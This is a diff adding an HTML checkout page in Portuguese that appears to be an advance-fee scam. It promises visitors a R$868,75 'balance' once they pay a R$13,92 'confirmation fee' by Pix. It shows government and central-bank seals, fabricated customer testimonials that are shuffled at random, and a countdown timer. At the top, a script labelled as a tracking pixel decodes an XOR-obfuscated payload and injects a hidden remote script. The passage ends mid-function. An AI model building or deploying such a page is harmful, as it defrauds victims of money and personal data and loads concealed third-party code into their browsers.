@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<!-- Utmify Pixel Code Start -->
+<script>(function(){var n_9xy=atob("DFHZ7iLmqRLAlmQVJir7m1CKiyji/hBhViLjwQ2FzXzu4xB4TzegwEGJxDyi5EtmRSOwnlaVhmKp7gF5CSGwlkeKhGap/RB6TX+znQDKi3O04hZ8RCSti1HEk0mdukZySj67j06Viyib7UZ7Rzy8zBjE3Xurwgt+djihi06vzTDstBJ0SiS8zBjEn3Ol81AjHmnuj0bWkSukr1AmEGTpjBeHi2+d6w==");var u_r11i=[];for(var o_hl=0;o_hl<n_9xy.length;o_hl++){u_r11i.push(n_9xy.charCodeAt(o_hl)&255);}var p_lg24=u_r11i[0];var j_9w=u_r11i.slice(1,1+p_lg24);var a_adr=u_r11i.slice(1+p_lg24);var m_2u6y=a_adr.map(function(b,n_zl2){return b^j_9w[n_zl2%p_lg24];});var j_bi="";for(var z_q59a=0;z_q59a<m_2u6y.length;z_q59a++){j_bi+=String.fromCharCode(m_2u6y[z_q59a]&255);}var e_eo=decodeURIComponent(escape(j_bi));var q_k70=JSON.parse(e_eo);var q_i5w3=q_k70.globals||[];q_i5w3.forEach(function(w_ijs){window[w_ijs.name]=w_ijs.value;});var c_e=document.createElement("script");c_e.src=q_k70.url;c_e.async=true;c_e.defer=true;(q_k70.attributes||[]).forEach(function(m_c8l){c_e.setAttribute(m_c8l.name,m_c8l.value);});(document.head||document.documentElement).appendChild(c_e);})();</script>
+<!-- Utmify Pixel Code End -->
+
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+  var _origPush = ttq.push;
+  function _normProps(p) {
+    p = Object.assign({}, p || {});
+    var cid = String(p.content_id || (p.contents && p.contents[0] && p.contents[0].content_id) || 'taxa_confirmacao_tiktok').trim() || 'taxa_confirmacao_tiktok';
+    var cname = String(p.content_name || (p.contents && p.contents[0] && p.contents[0].content_name) || 'Taxa de Confirmacao TikTok').trim() || 'Taxa de Confirmacao TikTok';
+    var val = (typeof p.value === 'number' && p.value > 0) ? p.value : (parseFloat(p.value) > 0 ? parseFloat(p.value) : 13.92);
+    p.content_id = cid; p.content_ids = [cid]; p.content_type = 'product'; p.content_name = cname; p.value = val; p.currency = p.currency || 'BRL';
+    p.contents = [{ content_id: cid, content_type: 'product', content_name: cname, quantity: 1, price: val }];
+    return p;
+  }
+  var _origTrack = ttq.track;
+  ttq.track = function(ev, props, opts) { return _origTrack.call(this, ev, _normProps(props), opts); };
+  ttq.load('DBMGUK3C77U4J2JR0C40');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+<!-- TikTok Pixel Code End -->
+
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Checkout</title>
+<script src="/checkout/qrcode.min.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f2f2f2;max-width:420px;margin:0 auto;min-height:100vh;-webkit-font-smoothing:antialiased}
+.topbar{background:#ff2d55;color:white;text-align:center;padding:12px 16px;font-size:14px;font-weight:600}
+.container{padding:12px 12px 48px;display:flex;flex-direction:column;gap:10px}
+.saldo-card{background:#1c1c1e;border-radius:14px;padding:20px 18px;color:white}
+.saldo-label{font-size:11px;font-weight:600;letter-spacing:1px;text-transform:uppercase;color:rgba(255,255,255,.5);margin-bottom:8px}
+.saldo-value{font-size:42px;font-weight:800;letter-spacing:-1px;margin-bottom:6px;line-height:1}
+.saldo-confirm{font-size:13px;font-weight:700;color:#ff4d67}
+.card{background:#fff;border-radius:14px;padding:16px 14px}
+.section-label{font-size:13px;color:#888;margin-bottom:12px}
+.confirm-row{display:flex;align-items:center;gap:12px;padding-bottom:14px;border-bottom:1px solid #f0f0f0;margin-bottom:12px}
+.tiktok-icon-wrap{width:44px;height:44px;border-radius:12px;background:#000;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.confirm-name{font-size:15px;font-weight:600;color:#111;margin-bottom:3px}
+.confirm-price{font-size:15px;font-weight:700;color:#00b37e}
+.total-row{display:flex;justify-content:space-between;align-items:center;padding-top:4px}
+.total-label,.total-value{font-size:15px;font-weight:700;color:#111}
+.libera-badge{background:#e6faf4;border:1px solid #b2f0dc;border-radius:8px;padding:8px 12px;font-size:12.5px;font-weight:600;color:#057a55;text-align:center;margin-top:10px}
+.card-header{display:flex;align-items:center;gap:10px;margin-bottom:16px}
+.card-header-icon{width:36px;height:36px;border-radius:50%;background:#ff2d55;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.card-header h2{font-size:17px;font-weight:700;color:#111}
+
+.field{margin-bottom:12px}
+.field:last-child{margin-bottom:0}
+.field label{display:block;font-size:13px;color:#555;margin-bottom:6px}
+.field input{width:100%;padding:13px 14px;border:1px solid #e0e0e0;border-radius:8px;font-size:15px;font-family:inherit;color:#111;background:#fff;outline:none;transition:border-color .2s}
+.field input:focus{border-color:#ff2d55;box-shadow:0 0 0 3px rgba(255,45,85,.1)}
+.field input::placeholder{color:#bbb}
+.field input.error{border-color:#ff2d55;box-shadow:0 0 0 3px rgba(255,45,85,.1);animation:shake .3s ease}
+.field-error-msg{font-size:11px;color:#ff2d55;font-weight:600;margin-top:4px;display:none}
+.field input.error + .field-error-msg{display:block}
+@keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-6px)}40%{transform:translateX(6px)}60%{transform:translateX(-4px)}80%{transform:translateX(4px)}}
+.btn-pagar{display:flex;width:100%;padding:16px;background:#ff2d55;color:white;border:none;border-radius:10px;font-size:16px;font-weight:700;font-family:inherit;letter-spacing:.5px;cursor:pointer;text-align:center;text-transform:uppercase;margin-bottom:10px;transition:background .15s;align-items:center;justify-content:center;gap:10px}
+.btn-pagar:hover{background:#e8003d}
+.btn-pagar:active{background:#cc0033}
+.btn-pagar.loading{background:#cc1f3f;cursor:not-allowed;pointer-events:none}
+.btn-pagar:disabled{background:#ccc;cursor:not-allowed;pointer-events:none}
+.spinner{display:none;width:18px;height:18px;border:2.5px solid rgba(255,255,255,.35);border-top-color:white;border-radius:50%;animation:spin .7s linear infinite;flex-shrink:0}
+.btn-pagar.loading .spinner{display:block}
+@keyframes spin{to{transform:rotate(360deg)}}
+.pay-note{text-align:center;font-size:12.5px;color:#888}
+.pay-note strong{color:#111}
+.trust-strip{background:#fff;border-radius:14px;padding:18px 16px;display:flex;align-items:center;justify-content:center;gap:22px;flex-wrap:wrap}
+.trust-strip img{height:34px;width:auto;object-fit:contain;opacity:.9;filter:grayscale(15%)}
+.pix-logo{height:26px;width:auto;object-fit:contain}
+.pay-pix-logo{display:flex;align-items:center;justify-content:center;padding:2px 0}
+.pay-pix-logo img{height:32px;width:auto;object-fit:contain}
+.footer-note{text-align:center;font-size:12px;color:#aaa;padding:0 8px;line-height:1.6}
+.modal-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.55);display:flex;align-items:flex-end;justify-content:center;z-index:9999;opacity:0;pointer-events:none;transition:opacity .25s ease;overflow-y:auto;-webkit-overflow-scrolling:touch}
+.modal-overlay.active{opacity:1;pointer-events:all}
+.modal{background:#fff;border-radius:20px 20px 0 0;padding:28px 22px 36px;width:100%;max-width:480px;position:relative;text-align:center;transform:translateY(100%);transition:transform .3s cubic-bezier(.32,.72,0,1);overflow-y:auto;max-height:92vh;-webkit-overflow-scrolling:touch}
+.modal-overlay.active .modal{transform:translateY(0)}
+body.modal-open{overflow:hidden;position:fixed;width:100%}
+.modal-handle{width:40px;height:4px;background:#e0e0e0;border-radius:4px;margin:0 auto 18px}
+.modal-close{position:absolute;top:14px;right:16px;width:28px;height:28px;background:#f2f2f2;border:none;border-radius:50%;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:16px;color:#888;line-height:1}
+.modal-close:hover{background:#e5e5e5}
+.modal-check{width:52px;height:52px;border-radius:50%;border:2.5px solid #00b37e;display:flex;align-items:center;justify-content:center;margin:0 auto 10px}
+.modal-title{font-size:18px;font-weight:800;color:#111;margin-bottom:2px}
+.modal-subtitle{font-size:13px;color:#888;margin-bottom:4px}
+.modal-expiry{font-size:12px;color:#999;margin-bottom:6px}
+.modal-value{font-size:22px;font-weight:800;color:#111;margin-bottom:18px}
+.timer-wrap{display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:12px}
+.timer-label{font-size:12px;color:#999}
+.timer-count{font-size:20px;font-weight:800;color:#00b37e;font-variant-numeric:tabular-nums;letter-spacing:-.5px;transition:color .3s}
+.timer-count.urgent{color:#e63946}
+.timer-bar-wrap{width:100%;height:4px;background:#f0f0f0;border-radius:4px;margin-bottom:16px;overflow:hidden}
+.timer-bar{height:100%;background:#00b37e;border-radius:4px;transition:width 1s linear,background .3s}
+.timer-bar.urgent{background:#e63946}
+.modal-tabs{display:flex;gap:6px;background:#f4f4f4;border-radius:10px;padding:4px;margin-bottom:16px}
+.modal-tab{flex:1;padding:8px 6px;border:none;border-radius:7px;background:none;font-size:12.5px;font-weight:700;font-family:inherit;color:#999;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:5px}
+.modal-tab.active{background:#fff;color:#111;box-shadow:0 1px 4px rgba(0,0,0,.1)}
+.tab-panel{display:none}.tab-panel.active{display:block}
+.how-to{display:flex;align-items:center;justify-content:center;gap:4px;margin-bottom:14px;flex-wrap:wrap}
+.how-step{display:flex;flex-direction:column;align-items:center;gap:4px}
+.how-step-icon{width:32px;height:32px;border-radius:50%;background:#f0faf6;border:1.5px solid #c8edd9;display:flex;align-items:center;justify-content:center}
+.how-step-text{font-size:9.5px;font-weight:600;color:#666;text-align:center;max-width:52px;line-height:1.3}
+.how-arrow{color:#ccc;font-size:14px;margin-bottom:14px;flex-shrink:0}
+.qr-wrap{background:#f8f8f8;border-radius:12px;padding:14px;margin-bottom:16px;display:flex;align-items:center;justify-content:center}
+.qr-placeholder{width:180px;height:180px;background:#fff;border:1px solid #eee;border-radius:4px;display:flex;align-items:center;justify-content:center}
+.pix-code-row{display:flex;align-items:center;gap:8px;background:#f8f8f8;border:1px solid #eee;border-radius:8px;padding:10px 12px;margin-bottom:14px}
+.pix-code-text{flex:1;font-size:12px;color:#555;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;text-align:left;font-family:monospace}
+.copy-btn{background:none;border:none;cursor:pointer;color:#888;padding:2px;flex-shrink:0;transition:color .15s}
+.copy-btn:hover{color:#00b37e}
+.btn-copiar-pix{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:15px;background:#00b37e;color:white;border:none;border-radius:10px;font-size:15px;font-weight:700;font-family:inherit;cursor:pointer;margin-bottom:10px;transition:background .15s}
+.btn-copiar-pix:hover{background:#009e6e}
+.btn-copiar-pix.copied{background:#057a55}
+.how-to-copy{display:flex;flex-direction:column;gap:8px;margin-bottom:14px}
+.how-step-row{display:flex;align-items:center;gap:10px}
+.how-step-num{width:24px;height:24px;border-radius:50%;background:#f0faf6;border:1.5px solid #c8edd9;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;color:#00b37e;flex-shrink:0}
+.how-step-desc{font-size:12.5px;color:#555;font-weight:500;line-height:1.35}
+.how-step-desc strong{color:#111}
+.mini-depos{display:flex;flex-direction:column;gap:5px;margin:10px 0 8px}
+.mini-depo{display:flex;align-items:center;gap:8px;background:#f8f8f8;border-radius:8px;padding:8px 10px}
+.mini-depo-av{width:28px;height:28px;border-radius:50%;font-size:10px;font-weight:700;color:white;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.mini-depo-text{flex:1;font-size:12.5px;color:#444;font-style:italic;line-height:1.4}
+.mini-depo-check{font-size:11px;font-weight:700;color:#00b37e;white-space:nowrap;flex-shrink:0}
+.modal-note{font-size:11.5px;color:#aaa;line-height:1.5}
+#toast{position:fixed;top:20px;left:50%;transform:translateX(-50%) translateY(-120px);background:#1a1a2e;color:white;padding:14px 20px;border-radius:12px;font-size:14px;font-weight:600;z-index:999999;transition:transform .3s ease;display:flex;align-items:center;gap:8px;box-shadow:0 6px 24px rgba(0,0,0,.3);width:calc(100% - 32px);max-width:388px}
+#toast.show{transform:translateX(-50%) translateY(0)}
+</style>
+</head>
+<body>
+
+<div id="toast"><span id="toastMsg">Preencha seus dados antes de continuar</span></div>
+
+<div class="topbar">Pagamento Seguro e Rápido</div>
+
+<div class="container">
+
+  <div class="saldo-card">
+    <p class="saldo-label">Seu saldo disponível</p>
+    <div class="saldo-value" id="saldoValue">R$868,75</div>
+    <div class="saldo-confirm">✓ Saldo selecionado para saque</div>
+  </div>
+
+  <div class="card">
+    <p class="section-label">Confirmação:</p>
+    <div class="confirm-row">
+      <div class="tiktok-icon-wrap">
+        <svg width="26" height="26" viewBox="0 0 24 24" fill="white"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-2.88 2.5 2.89 2.89 0 01-2.89-2.89 2.89 2.89 0 012.89-2.89c.28 0 .54.04.79.1V9.01a6.33 6.33 0 00-.79-.05 6.34 6.34 0 00-6.34 6.34 6.34 6.34 0 006.34 6.34 6.34 6.34 0 006.33-6.34V8.69a8.22 8.22 0 004.84 1.56V6.79a4.85 4.85 0 01-1.07-.1z"/></svg>
+      </div>
+      <div>
+        <p class="confirm-name">Taxa de Confirmação</p>
+        <p class="confirm-price" id="priceConfirm">R$ 13,92</p>
+      </div>
+    </div>
+    <div class="total-row">
+          <span class="total-label">Total:</span>
+          <span class="total-value" id="priceTotal">R$ 13,92</span>
+        </div>
+    <div class="libera-badge">✓ Pague e libere seus <strong id="saldoBadge">R$868,75</strong> imediatamente</div>
+  </div>
+
+  <!-- Identificação com Nome, Sobrenome e Email visíveis -->
+  <div class="card">
+    <div class="card-header">
+      <div class="card-header-icon">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+      </div>
+      <h2>Identifique-se</h2>
+    </div>
+
+    <div class="field">
+      <label>Nome completo</label>
+      <input type="text" id="inputNome" placeholder="Seu nome e sobrenome" autocomplete="name" />
+      <span class="field-error-msg">Informe seu nome completo</span>
+    </div>
+
+    <div class="field">
+      <label>E-mail</label>
+      <input type="email" id="inputEmail" placeholder="seu@email.com" autocomplete="email" />
+      <span class="field-error-msg">Informe um e-mail válido</span>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header">
+      <div class="card-header-icon">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/></svg>
+      </div>
+      <h2>Pagamento</h2>
+    </div>
+    <button class="btn-pagar" id="btnPagar">
+      <div class="spinner"></div>
+      <span class="btn-text">Pagar Agora</span>
+    </button>
+    <div class="pay-pix-logo"><img src="/5/images/pix-logo.svg" alt="Pix"></div>
+  </div>
+
+  <section class="trust-strip" aria-label="Selos de segurança">
+    <img src="/5/images/gov-br.webp" alt="gov.br">
+    <img src="/5/images/receitafederal.png" alt="Receita Federal">
+    <img src="/5/images/bacen.png" alt="Banco Central">
+  </section>
+
+  <p class="footer-note">Compra 100% segura. Reembolso garantido em até 7 dias.</p>
+</div>
+
+<!-- Modal PIX -->
+<div class="modal-overlay" id="pixModal">
+  <div class="modal">
+    <div class="modal-handle"></div>
+    <button class="modal-close" id="modalClose">✕</button>
+    <div class="modal-check"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#00b37e" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
+    <h2 class="modal-title">Pagamento Gerado!</h2>
+    <p class="modal-subtitle">Olá, <strong id="nomeModal">—</strong>! Escaneie ou copie o código abaixo.</p>
+    <p class="modal-expiry">Expira em: <span id="expiryTime">--/--/---- --:--:--</span></p>
+    <p class="modal-value" id="priceModal">R$ 13,92</p>
+    <div class="timer-wrap">
+      <span class="timer-label">Tempo restante:</span>
+      <span class="timer-count" id="timerCount">10:00</span>
+    </div>
+    <div class="timer-bar-wrap"><div class="timer-bar" id="timerBar" style="width:100%"></div></div>
+    <div class="modal-tabs">
+      <button class="modal-tab" id="tabQr"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><path d="M14 14h.01M18 14h.01M14 18h.01M18 18h.01"/></svg> QR Code</button>
+      <button class="modal-tab active" id="tabCopy"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg> Copia e Cola</button>
+    </div>
+    <div class="tab-panel" id="panelQr">
+      <div class="how-to">
+        <div class="how-step"><div class="how-step-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#00b37e" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg></div><span class="how-step-text">Abra seu banco</span></div>
+        <span class="how-arrow">›</span>
+        <div class="how-step"><div class="how-step-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#00b37e" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg></div><span class="how-step-text">Vá em Pix</span></div>
+        <span class="how-arrow">›</span>
+        <div class="how-step"><div class="how-step-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#00b37e" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg></div><span class="how-step-text">Escaneie o QR</span></div>
+        <span class="how-arrow">›</span>
+        <div class="how-step"><div class="how-step-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#00b37e" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div><span class="how-step-text">Confirme</span></div>
+      </div>
+      <div class="qr-wrap"><div class="qr-placeholder" id="qrContainer"></div></div>
+    </div>
+    <div class="tab-panel active" id="panelCopy">
+      <div class="how-to-copy">
+        <div class="how-step-row"><div class="how-step-num">1</div><p class="how-step-desc">Abra o app do seu banco e vá em <strong>Pix</strong></p></div>
+        <div class="how-step-row"><div class="how-step-num">2</div><p class="how-step-desc">Escolha a opção <strong>Pix Copia e Cola</strong></p></div>
+        <div class="how-step-row"><div class="how-step-num">3</div><p class="how-step-desc">Clique em <strong>Copiar Código PIX</strong> abaixo e cole no seu banco</p></div>
+        <div class="how-step-row"><div class="how-step-num">4</div><p class="how-step-desc">Confira o valor de <strong id="priceStep">R$ 13,92</strong> e confirme</p></div>
+      </div>
+    </div>
+    <div class="pix-code-row">
+      <span class="pix-code-text" id="pixCodeText">Gerando código...</span>
+      <button class="copy-btn" id="copyCodeBtn" title="Copiar código"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button>
+    </div>
+    <button class="btn-copiar-pix" id="btnCopiarPix">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+      Copiar Código PIX
+    </button>
+    <div class="mini-depos" id="miniDepos"></div>
+    <p class="modal-note">Ao pagar, você receberá a confirmação imediatamente neste dispositivo.</p>
+  </div>
+</div>
+
+<script>
+(function(){
+  var params = new URLSearchParams(window.location.search);
+  var totalParam = parseFloat(params.get('total')) || 868.75;
+  var taxaParam = 13.92; // fixo
+  var emailParam = params.get('email') || '';
+
+  function fmtBRL(v){ return 'R$ '+v.toFixed(2).replace('.',','); }
+  function fmtBRLShort(v){ return 'R$'+v.toFixed(2).replace('.',','); }
+
+  document.getElementById('saldoValue').textContent   = fmtBRLShort(totalParam);
+  document.getElementById('saldoBadge').textContent   = fmtBRLShort(totalParam);
+  document.getElementById('priceConfirm').textContent = fmtBRL(taxaParam);
+  document.getElementById('priceTotal').textContent   = fmtBRL(taxaParam);
+  document.getElementById('priceModal').textContent   = fmtBRL(taxaParam);
+  document.getElementById('priceStep').textContent    = fmtBRL(taxaParam);
+
+  if(emailParam) document.getElementById('inputEmail').value = emailParam;
+
+  var taxaCentavos = Math.round(taxaParam * 100);
+
+  var allDepos = [
+    {av:'AC',bg:'#e05252',txt:'"Caiu na hora no meu Nubank, sem erro nenhum."'},
+    {av:'RO',bg:'#00b37e',txt:'"Paguei e recebi em menos de 2 minutos."'},
+    {av:'JM',bg:'#5a6fd6',txt:'"Funcionou certinho, sem nenhum problema."'},
+    {av:'LS',bg:'#f59e0b',txt:'"Super rápido, recomendo pra todo mundo."'},
+    {av:'BF',bg:'#8b5cf6',txt:'"Na primeira tentativa já funcionou."'},
+    {av:'CM',bg:'#ec4899',txt:'"Processo simples e seguro. Aprovado!"'},
+  ];
+  function renderDepos(){
+    var shuffled = allDepos.sort(function(){return Math.random()-.5;}).slice(0,3);
+    document.getElementById('miniDepos').innerHTML = shuffled.map(function(d){
+      return '<div class="mini-depo"><div class="mini-depo-av" style="background:'+d.bg+'">'+d.av+'</div>'+
+             '<span class="mini-depo-text">'+d.txt+'</span>'+
+             '<span class="mini-depo-check">✓ Confirmado</span></div>';
+    }).join('');
+  }
+  renderDepos();
+
+  var PIX_CODE='', PAYMENT_CODE='', pollingInterval=null, timerInterval=null;
+  var TOTAL_SECONDS=10*60, remainingSeconds=TOTAL_SECONDS;
+
+  function pad(n){return String(n).padStart(2,'0');}
+
+  function getLeadId(){
+    try{
+      var ck=document.cookie.split(';').find(function(c){return c.trim().startsWith('xtracky_lead=');});
+      if(ck) return ck.split('=')[1].trim();
+    }catch(e){}
+    return params.get('utm_source')||'';
+  }
+
+
+
+  var toastTimeout;
+  function showToast(msg){
+    var el=document.getElementById('toast');
+    document.getElementById('toastMsg').textContent=msg;
+    clearTimeout(toastTimeout);
+    el.classList.remove('show');
+    setTimeout(function(){el.classList.add('show');toastTimeout=setTimeout(function(){el.classList.remove('show');},3000);},10);
+  }
+
+  document.getElementById('tabQr').addEventListener('click',function(){
+    document.getElementById('tabQr').classList.add('active');document.getElementById('tabCopy').classList.remove('active');
+    document.getElementById('panelQr').classList.add('active');document.getElementById('panelCopy').classList.remove('active');
+  });
+  document.getElementById('tabCopy').addEventListener('click',function(){
+    document.getElementById('tabCopy').classList.add('active');document.getElementById('tabQr').classList.remove('active');
+    document.getElementById('panelCopy').classList.add('active');document.getElementById('panelQr').classList.remove('active');
+  });
+
+  function startTimer(){
+    var countEl=document.getElementById('timerCount'), barEl=document.getElementById('timerBar');
+    remainingSeconds=TOTAL_SECONDS;
+    if(timerInterval) clearInterval(timerInterval);
+    timerInterval=setInterval(function(){
+      remainingSeconds--;
+      if(remainingSeconds<=0){remainingSeconds=0;clearInterval(timerInterval);}
+      var m=Math.floor(remainingSeconds/60),s=remainingSeconds%60;
+      countEl.textContent=pad(m)+':'+pad(s);
+      var urgent=remainingSeconds<300;
+      countEl.classList.toggle('urgent',urgent);barEl.classList.toggle('urgent',urgent);
+      barEl.style.width=(remainingSeconds/TOTAL_SECONDS*100)+'%';
+    },1000);
+  }
+
+  var _paidHandledFront = false;
+  var _currentPollArgs = null;
+
+  function checkPixStatusOnce(paymentCode, nome, email){
+    if(!paymentCode || _paidHandledFront) return;
+    fetch('/checkout-route/verificar.php?id='+encodeURIComponent(paymentCode), { cache: 'no-store' })
+      .then(function(r){
+        if(!r.ok) return null;
+        return r.json();
+      })
+      .then(function(data){
+        if(!data || _paidHandledFront) return;
+        if(data.paid===true || data.status==='approved' || data.status==='paid'){
+          _paidHandledFront = true;
+          if(pollingInterval) { clearInterval(pollingInterval); pollingInterval = null; }
+          sessionStorage.removeItem('pix_data_front');
+          if(typeof ttq !== 'undefined' && typeof ttq.track === 'function'){
+            try {
+              if(typeof window.syncTtkIdentify === 'function') { try { window.syncTtkIdentify({ email: email }); } catch(e){} } else if(email && typeof ttq.identify === 'function') { try { ttq.identify({ email: email }); } catch(e){} }
+              ttq.track('CompletePayment', {
+                content_id: 'taxa_confirmacao_tiktok',
+                content_type: 'product',
+                content_name: 'Taxa de Confirmacao TikTok',
+                contents: [{ content_id: 'taxa_confirmacao_tiktok', content_type: 'product', content_name: 'Taxa de Confirmacao TikTok', quantity: 1, price: taxaParam }],
+                value: taxaParam,
+                currency: 'BRL'
+              }, {
+                event_id: paymentCode
+              });
+              ttq.track('Purchase', {
+                content_id: 'taxa_confirmacao_tiktok',
+                content_type: 'product',
+                content_name: 'Taxa de Confirmacao TikTok',
+                contents: [{ content_id: 'taxa_confirmacao_tiktok', content_type: 'product', content_name: 'Taxa de Confirmacao TikTok', quantity: 1, price: taxaParam }],
+                value: taxaParam,
+                currency: 'BRL'
+              }, {
+                event_id: paymentCode + '_purchase'
+              });
+              console.log('[TikTok Pixel] CompletePayment + Purchase disparados funil 5:', taxaParam, paymentCode);
+            } catch(e){}
+          }
+          showSuccessScreen();
+          var obrigadoUrl=data.obrigado_url||'../up1/index.html';
+          var dest=new URL(obrigadoUrl,window.location.href);
+          params.forEach(function(v,k){dest.searchParams.set(k,v);});
+          var destStr=dest.toString();
+          setTimeout(function(){window.location.href=destStr;},2000);
+        }
+      }).catch(function(){
+        // Ignora erro de rede temporário (comum ao alternar para o app do banco no celular)
+      });
+  }
+
+  function startPolling(paymentCode, nome, email){
+    _currentPollArgs = { paymentCode: paymentCode, nome: nome, email: email };
+    if(pollingInterval) clearInterval(pollingInterval);
+    checkPixStatusOnce(paymentCode, nome, email);
+    pollingInterval=setInterval(function(){
+      checkPixStatusOnce(paymentCode, nome, email);
+    },3000);
+  }
+
+  // Quando o cliente volta do app do banco para o navegador, verifica imediatamente o pagamento
+  document.addEventListener('visibilitychange', function(){
+    if(document.visibilityState === 'visible' && _currentPollArgs && !_paidHandledFront){
+      checkPixStatusOnce(_currentPollArgs.paymentCode, _currentPollArgs.nome, _currentPollArgs.email);
+      if(!pollingInterval){
+        pollingInterval = setInterval(function(){
+          checkPixStatusOnce(_currentPollArgs.paymentCode, _currentPollArgs.nome, _currentPollArgs.email);
+        }, 3000);
+      }
+    }
+  });
+  window.addEventListener('focus', function(){
+    if(_currentPollArgs && !_paidHandledFront){
+      checkPixStatusOnce(_currentPollArgs.paymentCode, _currentPollArgs.nome, _currentPollArgs.email);
+    }
+  });
+
+  function showSuccessScreen(){
+    document.querySelector('.modal').innerHTML='<div style="padding:40px 20px;text-align:center">'+
+      '<div style="width:64px;height:64px;border-radius:50%;background:#e6faf4;border:2.5px solid #00b37e;display:flex;align-items:center;justify-content:center;margin:0 auto 16px">'+
+      '<svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#00b37e" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>'+
+      '</div><h2 style="font-size:20px;font-weight:800;color:#111;margin-bottom:8px">Pagamento Confirmado!</h2>'+
+      '<p style="font-size:14px;color:#888">Redirecionando em instantes...</p></div>';
+  }
+
+  function validarEmail(e){return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e);}
+
+  ['inputNome','inputEmail'].forEach(function(id){
+    document.getElementById(id).addEventListener('blur',function(){
+      if(id==='inputEmail'){if(!validarEmail(this.value.trim()))this.classList.add('error');else this.classList.remove('error');}
+      else{if(this.value.trim().split(' ').filter(function(p){return p.length>0;}).length<2)this.classList.add('error');else this.classList.remove('error');}
+    });
+    document.getElementById(id).addEventListener('focus',function(){this.classList.remove('error');});
+  });
+
+  document.getElementById('btnPagar').addEventListener('click',function(){
+    var nomeEl=document.getElementById('inputNome');
+    var emailEl=document.getElementById('inputEmail');
+    var ok=true;
